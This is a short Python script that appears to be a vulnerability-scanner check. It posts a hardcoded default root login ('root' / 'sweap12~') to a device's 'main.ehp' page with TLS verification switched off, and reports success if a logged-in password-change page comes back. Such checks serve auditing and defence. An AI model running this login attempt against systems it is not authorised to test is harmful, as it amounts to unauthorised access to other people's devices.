import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"main.ehp"
	body="httpd;General;lang=en&login_id=root&login_pw=sweap12~"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "document.formParent2.changepasswd1.value" in response.text and "passwd_change.ehp" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
